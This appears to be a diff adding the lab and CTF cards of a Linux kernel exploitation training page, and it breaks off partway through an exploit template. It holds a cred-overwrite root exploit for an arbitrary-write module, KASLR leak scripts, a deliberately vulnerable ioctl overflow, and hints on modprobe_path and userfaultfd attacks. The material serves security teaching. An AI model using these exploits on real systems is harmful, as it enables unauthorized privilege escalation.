+          <h4>Lab 5: Examine task_struct from /proc</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Explore a process's kernel data through <code>/proc</code>. Map out the task's credentials, memory layout, open files, namespaces, and capabilities.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# examine_task.sh — inspect a process's kernel-exposed info
+PID=$$
+
+echo "=== Process $PID ==="
+echo "--- Credentials ---"
+cat /proc/$PID/status | grep -E "^(Uid|Gid|Groups|Cap)"
+
+echo "--- Memory Map ---"
+cat /proc/$PID/maps | head -20
+
+echo "--- Open Files ---"
+ls -la /proc/$PID/fd/ 2>/dev/null | head -10
+
+echo "--- Namespaces ---"
+ls -la /proc/$PID/ns/
+
+echo "--- cgroup ---"
+cat /proc/$PID/cgroup
+
+echo "--- Capabilities (decoded) ---"
+CAP_EFF=$(cat /proc/$PID/status | grep CapEff | awk '{print $2}')
+capsh --decode=$CAP_EFF
+
+echo "--- Seccomp ---"
+cat /proc/$PID/status | grep Seccomp
+
+echo "--- comm ---"
+cat /proc/$PID/comm</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 6: Debug Kernel with GDB via QEMU</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Boot a kernel in QEMU with GDB debugging enabled. Attach GDB, set breakpoints on syscalls, inspect kernel structures, and single-step through kernel code.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Terminal 1: Launch QEMU with GDB
+qemu-system-x86_64 \
+    -m 256M \
+    -kernel ./bzImage \
+    -initrd ./initramfs.cpio.gz \
+    -append "console=ttyS0 nokaslr" \
+    -nographic -no-reboot \
+    -s -S
+
+# Terminal 2: Attach GDB
+gdb ./vmlinux
+(gdb) target remote :1234
+(gdb) c                              # let kernel boot
+
+# After boot, Ctrl+C in GDB to pause
+(gdb) b do_sys_openat2               # break on open() syscall
+(gdb) c
+
+# When breakpoint hits (trigger open in QEMU shell):
+(gdb) bt                             # backtrace
+(gdb) p $rdi                         # first argument
+(gdb) p *(struct task_struct *)$gs_base  # current task (approximate)
+
+# Load module symbols
+(gdb) add-symbol-file vuln.ko &lt;address_from_/proc/modules&gt;
+(gdb) b vuln_ioctl
+(gdb) c</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 7: SLUB Allocation Patterns</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Observe SLUB allocator behavior by allocating and freeing objects in a kernel module. Monitor slab cache stats to understand freelist behavior and allocation patterns.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// slub_lab.c — observe SLUB behavior
+#include &lt;linux/module.h&gt;
+#include &lt;linux/slab.h&gt;
+
+MODULE_LICENSE("GPL");
+
+#define NUM_ALLOCS 16
+
+static void *ptrs[NUM_ALLOCS];
+
+static int __init slub_lab_init(void) {
+    int i;
+
+    // Allocate objects from kmalloc-128
+    for (i = 0; i &lt; NUM_ALLOCS; i++) {
+        ptrs[i] = kmalloc(100, GFP_KERNEL);
+        printk(KERN_INFO "slub_lab: alloc[%d] = %px\n", i, ptrs[i]);
+    }
+
+    // Free every other one — observe fragmentation
+    for (i = 0; i &lt; NUM_ALLOCS; i += 2) {
+        kfree(ptrs[i]);
+        printk(KERN_INFO "slub_lab: freed[%d] = %px\n", i, ptrs[i]);
+        ptrs[i] = NULL;
+    }
+
+    // Reallocate — observe LIFO freelist behavior
+    for (i = 0; i &lt; NUM_ALLOCS; i += 2) {
+        ptrs[i] = kmalloc(100, GFP_KERNEL);
+        printk(KERN_INFO "slub_lab: realloc[%d] = %px\n", i, ptrs[i]);
+    }
+
+    return 0;
+}
+
+static void __exit slub_lab_exit(void) {
+    int i;
+    for (i = 0; i &lt; NUM_ALLOCS; i++) {
+        kfree(ptrs[i]);
+    }
+    printk(KERN_INFO "slub_lab: cleaned up\n");
+}
+
+module_init(slub_lab_init);
+module_exit(slub_lab_exit);</code></pre>
+<pre><code class="language-bash"># After loading module:
+dmesg | grep slub_lab
+# Observe: freed addresses are reused in LIFO order
+# Compare addresses to confirm same slab page reuse
+
+# Monitor slab stats
+cat /proc/slabinfo | grep kmalloc-128
+sudo slabtop -o | head -20</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 8: Examine Kernel Memory Map</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Map out the kernel's virtual address space from within a running system. Identify direct mapping, vmalloc, module, and kernel text regions.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# kernel_memmap.sh — map out kernel address space
+
+echo "=== Kernel Text ==="
+grep -E "_stext|_etext" /proc/kallsyms
+
+echo "=== Module Region ==="
+head -5 /proc/modules
+# Address is the module's .text base
+
+echo "=== vmalloc ==="
+cat /proc/vmallocinfo | head -10
+
+echo "=== Physical Memory Map ==="
+cat /proc/iomem | head -20
+
+echo "=== Page Offset Base ==="
+# Direct mapping base — find via kallsyms
+grep page_offset_base /proc/kallsyms
+
+echo "=== Kernel .text range ==="
+STEXT=$(grep ' T _stext' /proc/kallsyms | awk '{print $1}')
+ETEXT=$(grep ' T _etext' /proc/kallsyms | awk '{print $1}')
+echo "_stext = 0x$STEXT"
+echo "_etext = 0x$ETEXT"
+python3 -c "print(f'Kernel text size: {(0x$ETEXT - 0x$STEXT) / 1024 / 1024:.2f} MB')"</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 9: Write a Character Device Driver</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Create a full character device that supports <code>open</code>, <code>read</code>, <code>write</code>, <code>release</code>, and <code>ioctl</code>. Register it in <code>/dev/</code> and test from userspace.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// chardev.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/fs.h&gt;
+#include &lt;linux/miscdevice.h&gt;
+#include &lt;linux/uaccess.h&gt;
+#include &lt;linux/slab.h&gt;
+
+MODULE_LICENSE("GPL");
+#define BUFSIZE 1024
+
+struct chardev_data {
+    char buffer[BUFSIZE];
+    size_t len;
+};
+
+static int chardev_open(struct inode *inode, struct file *f) {
+    struct chardev_data *data = kzalloc(sizeof(*data), GFP_KERNEL);
+    if (!data) return -ENOMEM;
+    f-&gt;private_data = data;
+    printk(KERN_INFO "chardev: opened\n");
+    return 0;
+}
+
+static ssize_t chardev_read(struct file *f, char __user *buf, size_t len, loff_t *off) {
+    struct chardev_data *data = f-&gt;private_data;
+    size_t to_read = min(len, data-&gt;len - (size_t)*off);
+    if (*off &gt;= data-&gt;len) return 0;
+    if (copy_to_user(buf, data-&gt;buffer + *off, to_read)) return -EFAULT;
+    *off += to_read;
+    return to_read;
+}
+
+static ssize_t chardev_write(struct file *f, const char __user *buf, size_t len, loff_t *off) {
+    struct chardev_data *data = f-&gt;private_data;
+    size_t to_write = min(len, (size_t)BUFSIZE);
+    if (copy_from_user(data-&gt;buffer, buf, to_write)) return -EFAULT;
+    data-&gt;len = to_write;
+    return to_write;
+}
+
+static int chardev_release(struct inode *inode, struct file *f) {
+    kfree(f-&gt;private_data);
+    return 0;
+}
+
+static struct file_operations chardev_fops = {
+    .owner   = THIS_MODULE,
+    .open    = chardev_open,
+    .read    = chardev_read,
+    .write   = chardev_write,
+    .release = chardev_release,
+};
+
+static struct miscdevice chardev_misc = {
+    .minor = MISC_DYNAMIC_MINOR, .name = "chardev", .fops = &amp;chardev_fops
+};
+static int __init chardev_init(void) { return misc_register(&amp;chardev_misc); }
+static void __exit chardev_exit(void) { misc_deregister(&amp;chardev_misc); }
+module_init(chardev_init);
+module_exit(chardev_exit);</code></pre>
+<pre><code class="language-bash"># Test from userspace
+echo "Hello Kernel!" &gt; /dev/chardev
+cat /dev/chardev</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 10: Explore the cred Structure</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write a kernel module that reads the current process's <code>cred</code> struct and prints UID/GID/capabilities. Then use <code>prepare_kernel_cred</code>/<code>commit_creds</code> to understand privilege escalation primitives.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// cred_explorer.c
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/cred.h&gt;
+#include &lt;linux/sched.h&gt;
+
+MODULE_LICENSE("GPL");
+
+static int __init cred_init(void) {
+    const struct cred *c = current_cred();
+
+    printk(KERN_INFO "=== Current Process Credentials ===\n");
+    printk(KERN_INFO "comm: %s, pid: %d\n", current-&gt;comm, current-&gt;pid);
+    printk(KERN_INFO "uid=%d euid=%d suid=%d\n",
+           c-&gt;uid.val, c-&gt;euid.val, c-&gt;suid.val);
+    printk(KERN_INFO "gid=%d egid=%d sgid=%d\n",
+           c-&gt;gid.val, c-&gt;egid.val, c-&gt;sgid.val);
+    printk(KERN_INFO "cap_effective=0x%llx\n",
+           (unsigned long long)c-&gt;cap_effective.val);
+
+    // Show what prepare_kernel_cred(NULL) would create:
+    // struct cred *root_cred = prepare_kernel_cred(NULL);
+    // → uid=0, euid=0, full capabilities
+    // commit_creds(root_cred) → apply to current task
+    // WARNING: don't actually do this outside CTF!
+
+    printk(KERN_INFO "cred struct address: %px\n", c);
+    printk(KERN_INFO "task_struct address: %px\n", current);
+
+    return 0;
+}
+
+static void __exit cred_exit(void) {
+    printk(KERN_INFO "cred_explorer unloaded\n");
+}
+
+module_init(cred_init);
+module_exit(cred_exit);</code></pre>
+<pre><code class="language-bash"># Load as root vs unprivileged user to compare:
+sudo insmod cred_explorer.ko
+dmesg | grep -A8 "Current Process Credentials"
+sudo rmmod cred_explorer
+
+# Load as unprivileged (if permitted):
+# Compare uid/euid values and capabilities</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 11: Trace a Syscall from Userspace to Kernel</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Trace the full path of a <code>write()</code> syscall from the user's C call, through glibc, the SYSCALL instruction, <code>entry_SYSCALL_64</code>, the syscall table dispatch, to the actual kernel <code>ksys_write()</code> implementation. Use GDB on a QEMU kernel.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># 1. Boot QEMU with nokaslr and GDB
+qemu-system-x86_64 -kernel bzImage -initrd initramfs.cpio.gz \
+    -append "console=ttyS0 nokaslr" -nographic -s -S
+
+# 2. In GDB:
+gdb vmlinux
+(gdb) target remote :1234
+(gdb) b entry_SYSCALL_64
+(gdb) c
+
+# 3. In QEMU, trigger: echo test &gt; /tmp/foo
+# GDB will break at entry_SYSCALL_64
+
+(gdb) si 20         # step through swapgs, stack switch
+(gdb) p/x $rax      # syscall number (1 = write)
+(gdb) b ksys_write
+(gdb) c
+
+# At ksys_write:
+(gdb) p (int)$rdi    # fd
+(gdb) p (size_t)$rdx # count
+(gdb) bt             # full call chain
+
+# Trace return path
+(gdb) finish
+(gdb) b swapgs_restore_regs_and_return_to_usermode
+(gdb) c</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 12: Build a CTF initramfs with Vulnerable Module</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Package a vulnerable kernel module into an initramfs, write an init script that loads it, drops to unprivileged shell, and sets up the flag. This is the standard CTF kernel challenge setup.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# build_ctf_env.sh
+
+# 1. Create initramfs structure
+mkdir -p initramfs/{bin,dev,etc,home/user,lib,proc,sys,tmp}
+
+# 2. Copy busybox
+cp /path/to/busybox initramfs/bin/
+cd initramfs/bin &amp;&amp; ln -s busybox sh &amp;&amp; cd ../..
+
+# 3. Copy vulnerable module
+cp vuln.ko initramfs/lib/
+
+# 4. Create flag
+echo "FLAG{k3rn3l_pwn_1s_fun}" &gt; initramfs/flag.txt
+
+# 5. Write init script
+cat &gt; initramfs/init &lt;&lt; 'INITEOF'
+#!/bin/sh
+mount -t proc proc /proc
+mount -t sysfs sysfs /sys
+mount -t devtmpfs devtmpfs /dev
+
+# Set permissions
+chmod 400 /flag.txt
+chown root:root /flag.txt
+
+# Kernel hardening
+echo 1 &gt; /proc/sys/kernel/kptr_restrict
+echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+
+# Load vulnerable module
+insmod /lib/vuln.ko
+chmod 666 /dev/vuln
+
+echo "=== Kernel CTF Challenge ==="
+echo "Read /flag.txt to win!"
+
+# Drop to unprivileged shell
+setsid cttyhack setuidgid 1000 sh
+
+poweroff -f
+INITEOF
+chmod +x initramfs/init
+
+# 6. Pack and launch
+cd initramfs
+find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; ../ctf.cpio.gz
+cd ..
+
+qemu-system-x86_64 \
+    -m 128M \
+    -kernel bzImage \
+    -initrd ctf.cpio.gz \
+    -append "console=ttyS0 quiet loglevel=3 oops=panic panic=-1 kaslr" \
+    -nographic -monitor /dev/null -no-reboot \
+    -cpu qemu64,+smep,+smap</code></pre>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 13: Analyze seccomp Filters</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Write a program that installs a seccomp-bpf filter, then use <code>seccomp-tools</code> to dump and analyze the filter. Identify which syscalls are blocked and which are allowed.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// seccomp_lab.c
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/prctl.h&gt;
+#include &lt;linux/seccomp.h&gt;
+#include &lt;linux/filter.h&gt;
+#include &lt;linux/audit.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+// Block execve and execveat, allow everything else
+struct sock_filter filter[] = {
+    // Load architecture
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+
+    // Load syscall number
+    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
+
+    // Block execve (59)
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+
+    // Block execveat (322)
+    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),
+
+    // Allow everything else
+    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
+};
+
+int main() {
+    struct sock_fprog prog = {
+        .len = sizeof(filter) / sizeof(filter[0]),
+        .filter = filter,
+    };
+
+    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog);
+
+    printf("Seccomp filter active! PID=%d\n", getpid());
+    printf("Try running: seccomp-tools dump ./seccomp_lab\n");
+
+    // This will work (write is allowed)
+    write(1, "write() works!\n", 15);
+
+    // This would be killed: execve("/bin/sh", ...)
+    pause();
+}</code></pre>
+<pre><code class="language-bash">gcc -o seccomp_lab seccomp_lab.c
+seccomp-tools dump ./seccomp_lab
+# Outputs BPF disassembly showing the filter rules</code></pre>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- CTF TAB -->
+      <div class="tab-content" id="ctf">
+        <h2>CTF Challenges</h2>
+
+        <div class="ctf-card">
+          <h4>Challenge 1: Kernel Version Extraction</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">You're given a <code>bzImage</code> (compressed kernel). Extract the kernel version string without booting it.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Given: bzImage file
+# Find the version string embedded in the compressed image
+
+# Method 1: strings
+strings bzImage | grep -i "Linux version"
+
+# Method 2: file command
+file bzImage
+
+# Method 3: extract and check
+# bzImage = header + compressed vmlinux
+# The version is at a known offset in the header
+dd if=bzImage bs=1 skip=526 count=64 2>/dev/null | strings</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>The kernel version string is embedded as plain ASCII in the bzImage. <code>strings bzImage | grep "Linux version"</code> will find it directly. You can also use <code>extract-vmlinux</code> to decompress and then check the uncompressed vmlinux.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 2: /proc Flag Hunter</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A kernel module stores a flag in a custom <code>/proc</code> entry. Find and read it. The module creates a proc entry but the name is unknown.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># The flag is in a /proc entry created by a loaded module
+
+# Approach: find unusual /proc entries
+ls /proc/ | sort
+# Compare against a known default set
+
+# Check loaded modules for hints
+cat /proc/modules
+lsmod
+
+# Read all readable /proc entries
+for f in /proc/*; do
+    [ -f "$f" ] &amp;&amp; cat "$f" 2>/dev/null | grep -l "FLAG\|flag" 2>/dev/null
+done
+
+# Or search recursively
+grep -r "FLAG{" /proc/ 2>/dev/null</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Check <code>lsmod</code> to find the module name — the proc entry often matches the module name. Try <code>cat /proc/&lt;module_name&gt;</code>. Also try <code>find /proc -maxdepth 1 -newer /proc/version</code> to find recently created entries.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 3: Device Interaction</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A kernel module registers <code>/dev/challenge</code>. It responds to specific ioctl commands. Send the correct magic number to get the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// interact.c
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;string.h&gt;
+
+int main() {
+    int fd = open("/dev/challenge", O_RDWR);
+    if (fd &lt; 0) { perror("open"); return 1; }
+
+    char buf[256] = {0};
+
+    // Try common ioctl magic numbers
+    // Hint: check the module source or strings output
+    unsigned int cmds[] = {0x1337, 0xDEAD, 0xCAFE, 0x4141, 0x1234};
+    for (int i = 0; i &lt; 5; i++) {
+        memset(buf, 0, 256);
+        int ret = ioctl(fd, cmds[i], buf);
+        if (ret == 0 &amp;&amp; strlen(buf) &gt; 0) {
+            printf("cmd 0x%x returned: %s\n", cmds[i], buf);
+        }
+    }
+    close(fd);
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Extract the kernel module from the initramfs and run <code>strings vuln.ko | grep -i flag</code> or use Ghidra/IDA to reverse the ioctl handler. The magic command number is usually a constant in the switch statement.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 4: Kernel Module Reverse Engineering</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Given <code>vuln.ko</code> (a compiled kernel module), reverse engineer it to find the hidden backdoor command and its expected password.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Step 1: Basic recon
+file vuln.ko
+modinfo vuln.ko
+strings vuln.ko | less
+
+# Step 2: Disassemble
+objdump -d vuln.ko | less
+# Or better: load in Ghidra with kernel headers
+
+# Step 3: Look for ioctl handler
+objdump -t vuln.ko | grep -i ioctl
+# Find the function, trace the switch cases
+
+# Step 4: Look for string comparisons
+strings vuln.ko | grep -E "password|secret|backdoor|flag"
+
+# Step 5: Check for obfuscated strings
+# XOR-encoded strings won't show in `strings`
+# Look for loops with XOR operations in disassembly</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Load the .ko file in Ghidra (select ELF + kernel module). Find the ioctl handler by looking for the function registered in <code>file_operations</code>. The backdoor is usually a hidden case in the switch statement that compares <code>copy_from_user</code> input against a hardcoded value.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 5: KASLR Leak via /proc</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">KASLR is enabled but the challenge has a misconfigured <code>/proc</code> entry that leaks kernel addresses. Find the leak and calculate the kernel base.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Check if kallsyms shows real addresses
+cat /proc/kallsyms | head -5
+# If addresses are 0: kptr_restrict is on
+
+# Check for info leaks in dmesg (if readable)
+dmesg 2>/dev/null | grep -E "0xffff|ffffffff"
+
+# Check /proc entries from loaded modules
+for f in /proc/*; do
+    [ -f "$f" ] &amp;&amp; cat "$f" 2>/dev/null | grep -E "0xffff" &amp;&amp; echo "  ^ Found in $f"
+done
+
+# Check /sys
+find /sys/module/ -readable -type f 2>/dev/null | while read f; do
+    cat "$f" 2>/dev/null | grep -E "0xffff" &amp;&amp; echo "  ^ Found in $f"
+done</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+# Once you find a leaked address, calculate base:
+leaked_addr = 0xffffffff81234567  # from /proc leak
+# Known offset of leaked symbol (from unslid vmlinux or kallsyms with nokaslr)
+known_offset = 0x234567            # offset from kernel base
+
+kernel_base = leaked_addr - known_offset
+print(f"Kernel base: {hex(kernel_base)}")
+print(f"KASLR slide: {hex(kernel_base - 0xffffffff81000000)}")</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Common KASLR leaks: <code>/proc/modules</code> shows module base addresses (sometimes readable), a custom <code>/proc</code> entry by the challenge module might print kernel pointers via <code>%px</code> or <code>%p</code> format. Also check <code>/sys/module/&lt;name&gt;/sections/.text</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Credential Manipulation</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">A vulnerable kernel module lets you write to an arbitrary kernel address. Use it to overwrite the current process's <code>cred</code> structure to escalate to root and read the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-c">// exploit.c — cred overwrite via arbitrary write
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+// Structures matching the vulnerable module's interface
+struct write_req {
+    unsigned long addr;
+    unsigned long value;
+};
+
+#define IOCTL_ARB_WRITE 0x4242
+
+int main() {
+    int fd = open("/dev/vuln", O_RDWR);
+
+    // Step 1: Leak task_struct address
+    // (depends on what info leaks are available)
+
+    // Step 2: Find cred pointer in task_struct
+    // Offset varies by kernel version — check vmlinux symbols
+    // offsetof(struct task_struct, cred) — typically around 0x638-0x6c0
+
+    // Step 3: Read cred pointer, then overwrite uid/euid fields
+    // cred->uid is at offset 0x04, euid at offset 0x14
+    unsigned long cred_addr = /* leaked */;
+
+    struct write_req req;
+    // Overwrite uid to 0
+    req.addr = cred_addr + 4;   // uid offset in struct cred
+    req.value = 0;
+    ioctl(fd, IOCTL_ARB_WRITE, &amp;req);
+
+    // Overwrite euid to 0
+    req.addr = cred_addr + 20;  // euid offset
+    req.value = 0;
+    ioctl(fd, IOCTL_ARB_WRITE, &amp;req);
+
+    // Step 4: Check if we're root now
+    if (getuid() == 0) {
+        printf("[+] Got root!\n");
+        system("cat /flag.txt");
+    }
+
+    close(fd);
+    return 0;
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Use <code>commit_creds(prepare_kernel_cred(NULL))</code> if you have code execution in kernel context (ROP). For arbitrary write only: leak <code>current_task</code> from <code>/proc</code> or GDB, walk to the <code>cred</code> pointer, zero out UID/EUID/GID/EGID fields (8 consecutive 4-byte values starting at cred+4).</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: Syscall Number Identification</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">A binary makes a mysterious direct syscall using inline assembly. Identify the syscall number and its purpose from the disassembly.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Given: mystery_binary
+# Disassemble and find the syscall instruction
+
+objdump -d mystery_binary | grep -B5 "syscall"
+# Look for:
+#   mov $XX, %rax    ← syscall number
+#   mov ..., %rdi    ← arg1
+#   mov ..., %rsi    ← arg2
+#   syscall
+
+# Or in GDB:
+gdb ./mystery_binary
+(gdb) catch syscall
+(gdb) r
+(gdb) p/d $rax        # syscall number when it stops
+
+# Look up the number:
+# /usr/include/asm/unistd_64.h
+# Or: ausyscall $NUMBER</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Common x86_64 syscall numbers to know: 0=read, 1=write, 2=open, 59=execve, 57=fork, 62=kill, 101=ptrace, 175=init_module. Check the value loaded into RAX right before the <code>syscall</code> instruction. Reference: <code>ausyscall --dump</code>.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: Kernel Config Analysis</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Given a kernel's <code>.config</code> file (or <code>/proc/config.gz</code>), determine which security mitigations are enabled and find the weakest attack surface.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Extract config if compressed
+zcat /proc/config.gz &gt; .config
+# Or: config is provided as a file
+
+# Check critical security options
+grep -E "^CONFIG_(RANDOMIZE_BASE|X86_SMAP|X86_SMEP|PAGE_TABLE_ISOLATION)=" .config
+grep -E "^CONFIG_(STACKPROTECTOR|STACKPROTECTOR_STRONG)=" .config
+grep -E "^CONFIG_(CFI_CLANG|RANDSTRUCT)=" .config
+grep -E "^CONFIG_(STATIC_USERMODEHELPER|KALLSYMS)=" .config
+grep -E "^CONFIG_(DEVMEM|DEVKMEM|PROC_KCORE)=" .config
+grep -E "^CONFIG_(USERFAULTFD|IO_URING)=" .config
+grep -E "^CONFIG_(SLAB_FREELIST_RANDOM|SLAB_FREELIST_HARDENED)=" .config
+
+# Look for debug options (helpful for exploitation)
+grep -E "^CONFIG_(DEBUG_INFO|GDB_SCRIPTS|PROC_CONFIG_GZ)=" .config
+grep "^CONFIG_KPROBES=" .config</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>Focus on what's <em>missing</em>. If <code>CONFIG_SLAB_FREELIST_HARDENED</code> is not set, freelist pointer corruption is easier. If <code>CONFIG_STATIC_USERMODEHELPER</code> is off, <code>modprobe_path</code> overwrite works. If <code>CONFIG_USERFAULTFD=y</code>, userfaultfd-based race conditions are possible.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Find the Vulnerable ioctl</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">A kernel module has multiple ioctl handlers. One of them has a buffer overflow. Reverse engineer the module, find the vulnerable ioctl command number, and determine the overflow size.</p>
+          <div class="setup-code">
+<pre><code class="language-bash"># Extract module from initramfs
+mkdir fs &amp;&amp; cd fs
+zcat ../initramfs.cpio.gz | cpio -idmv
+find . -name "*.ko" -exec cp {} .. \;
+cd ..
+
+# Analyze the module
+strings vuln.ko
+objdump -d vuln.ko &gt; vuln.asm
+
+# In Ghidra: look for the ioctl handler
+# Find file_operations struct → .unlocked_ioctl function pointer
+# Analyze each switch case:
+# - Look for copy_from_user with user-controlled size
+# - Look for stack buffers smaller than copy size
+# - Look for missing bounds checks</code></pre>
+<pre><code class="language-c">// What to look for in the decompilation:
+static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
+    char buf[64];  // ← stack buffer
+    switch (cmd) {
+        case 0xBEEF:
+            // Safe: bounded copy
+            copy_from_user(buf, (void *)arg, 64);
+            break;
+        case 0xDEAD:
+            // VULNERABLE: copies user-specified length into fixed buffer!
+            struct { size_t len; char data[]; } *req = (void *)arg;
+            copy_from_user(buf, req-&gt;data, req-&gt;len);  // overflow if len &gt; 64!
+            break;
+    }
+}</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>In the disassembly, look for <code>copy_from_user</code> calls where the third argument (length/RDX) comes from user input rather than a constant. The vulnerable case will have a stack-allocated buffer (negative RBP offset) and an unbounded or user-controlled copy length.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Build Your Exploit Environment</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Given challenge files (bzImage, initramfs.cpio.gz, run.sh), set up a complete exploit development environment: extract the filesystem, identify the module, find symbols, set up GDB, and build a template exploit.</p>
+          <div class="setup-code">
+<pre><code class="language-bash">#!/bin/bash
+# setup_exploit_env.sh
+
+# 1. Extract initramfs
+mkdir rootfs &amp;&amp; cd rootfs
+zcat ../initramfs.cpio.gz | cpio -idmv
+cd ..
+
+# 2. Find and analyze the module
+MODULE=$(find rootfs -name "*.ko" | head -1)
+echo "Module: $MODULE"
+modinfo "$MODULE"
+strings "$MODULE" | grep -iE "flag|password|secret|ioctl"
+
+# 3. Check init script for setup details
+cat rootfs/init
+
+# 4. Extract vmlinux for GDB symbols
+vmlinux-to-elf bzImage vmlinux 2>/dev/null || \
+    extract-vmlinux bzImage &gt; vmlinux
+
+# 5. Find key symbol addresses (with nokaslr)
+# Boot once with nokaslr to get base addresses
+# Or parse vmlinux:
+nm vmlinux | grep -E "prepare_kernel_cred|commit_creds"
+nm vmlinux | grep "modprobe_path"
+
+# 6. Check run.sh for QEMU flags (protections)
+cat run.sh | grep -E "smep|smap|kaslr|kpti"</code></pre>
+<pre><code class="language-c">// exploit_template.c
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
